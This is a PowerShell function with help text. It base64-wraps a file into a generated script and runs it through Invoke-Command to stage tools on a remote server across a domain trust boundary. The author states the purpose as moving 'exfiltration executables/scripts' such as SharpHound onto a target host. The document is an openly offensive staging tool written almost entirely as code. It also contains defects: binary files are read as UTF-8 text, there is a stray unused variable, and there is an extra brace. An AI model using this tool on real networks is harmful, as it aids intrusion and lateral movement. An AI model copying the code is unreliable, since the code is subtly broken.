Function Invoke-Transfer {

<#
.SYNOPSIS
Invoke-Transfer will allow you to transfer files using a powershell session.

.DESCRIPTION
This powershell script will take a input file, base64 it and create
another powershell script inwhich you can now use the Invoke-Command's 
FilePath paramter to load the script directly ontop another powershell session.

The creation of this started when I ran into the famous double-hop powershell
session issue. On my vm machine Tech.domain.local, I had a ps-session with srv.domain.local.
srv.domain.local. Within srv.domain.local, it was used to pass information to a database in
another domain called internal.local. I had credentials to use to access srv2.internal.local,
which I would Invoke-Command's ScriptBlock to get code-execuation on. I couldn't transfer 
files the traditional way as it was a one way trust boundary, couldn't use another ps-session
due to double-hop issues (& credssp was enabled on both!). Invoke-Transfer allows me to 
transfer my exfiltration executables/scripts onto srv2.internal.local with ease.

.PARAMETER File
Name of File that is to be transfer.

.EXAMPLE
PS > Invoke-Transfer -File SharpHound.exe
        This will create a file in the same directory called Mod_SharpHound.exe.ps1
PS > Invoke-Command -ComputerName <Server> -FilePath .\Mod_SharpHound.exe.ps1
        After ran, this will now create a file in the $home directory of the server machine,
        in this case, Mod_SharpHound.exe is located on <server>.
PS > Invoke-Command -ComputerName <Server> -ScriptBlock{.\Mod_SharpHound.exe.ps1}
        This will run the application on the server.

.LINK
https://techryptic.github.io
#>


[cmdletbinding()]
Param (
[string]$File
)

 Process {
"Checking if $file exist..."

if (Test-Path $file -PathType leaf)
{
$fileName = $file
$fileContent = get-content $fileName -raw
$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
$finalfile = "Mod_" + $file

$Title = '$base64data = "'
$Output = “This is TEST”
$Title + 
$fileContentEncoded + 
'"' + "`n`n" + 
"`$decodedata = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$base64data))" + 
"`n"+
"Add-Content `$home\Documents\$finalfile `$decodedata" | Out-file “$finalfile.ps1”

"Finished!"
""
}

else {
""
"DOES NOT EXIST"
}}}

# Uncomment the command below to run script automatically with it's own parameters.
#Invoke-Transfer -File SharpView.exe
